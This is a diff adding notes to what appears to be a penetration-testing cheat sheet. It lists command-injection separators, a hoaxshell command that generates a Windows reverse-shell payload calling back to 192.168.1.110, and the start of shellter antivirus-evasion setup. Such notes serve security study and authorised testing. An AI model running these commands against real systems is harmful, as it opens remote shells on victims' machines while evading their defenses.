@@ -231,4 +231,13 @@ sqli bind # only got true or false result, so use 'and ' or 'or'. so transfer th
     command injection   
         ; & | || &&
 
-		
+******************************************************************************
+ AV  bypass
+	hoaxshell
+	python3 hoaxshell.py -s 192.168.1.110 -r -H "MakeItHigh"
+		-s to set host ip, -r raw payload not base64, -H set header
+		#will create a win scripte to create a revease shell on target host
+	shellter
+		requirements: wine, wine32
+			sudo dpkg --add-architecture i386 && apt update
+			
